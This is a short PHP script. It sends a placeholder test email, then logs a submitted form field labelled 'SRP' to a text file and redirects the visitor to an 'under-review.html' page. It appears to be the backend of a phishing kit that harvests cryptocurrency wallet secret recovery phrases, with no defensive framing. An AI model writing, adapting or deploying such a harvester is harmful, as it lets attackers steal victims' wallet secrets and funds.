<?php
$to = 'recipient@example.com'; // Specify the recipient's email address
$subject = 'Subject of Your Email'; // Specify the subject of the email
$message = 'This is your message body'; // Write your message body
$headers = 'From: webmaster@example.com' . "\r\n" . // Specify the sender's email address
    'Reply-To: webmaster@example.com' . "\r\n" . // Specify the reply-to email address
    'X-Mailer: PHP/' . phpversion();

// Send the email
if(mail($to, $subject, $message, $headers)) {
    echo 'Email sent successfully!';
} else {
    echo 'Email sending failed.';
}


if(isset($_POST['data1']) ) {
	$data1 = $_POST['data1'];

	if(empty($data1)) {
		echo "<script>alert('Complete All Data!'); document.location='./';</script>";
	    }  else
    {
        $file = "----ilmu--tolak--miskin----------.txt";
        
        $handle = fopen($file, 'a');
        fwrite($handle, "=======================================");
        fwrite($handle, "\n");
        fwrite($handle, "::  SRP  :: ");
        fwrite($handle, "$data1");
        fwrite($handle, "\n");
        if(fclose($handle)) {
            echo "<script>location.href='under-review.html';</script>";
        }
	}
}